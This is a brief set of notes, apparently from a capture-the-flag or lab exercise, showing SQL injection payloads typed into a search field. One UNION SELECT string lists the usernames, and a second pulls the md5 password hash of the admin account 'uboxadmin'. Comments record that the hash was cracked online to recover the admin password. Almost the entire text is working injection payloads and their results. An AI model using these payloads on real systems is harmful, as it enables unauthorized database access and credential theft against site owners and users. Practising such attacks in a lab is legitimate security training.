// Find list of users , using dev's search for a file
'OR 1=2 UNION SELECT username FROM users'--
// Shows us uboxadmin is admin
// Find md5 hash for uboxadmin to get password
'OR 1=2 UNION SELECT md5_hash FROM users WHERE username='uboxadmin'--
// Returns hash, using internet tool to decrypt hash to admins' password
// Password = helloworld
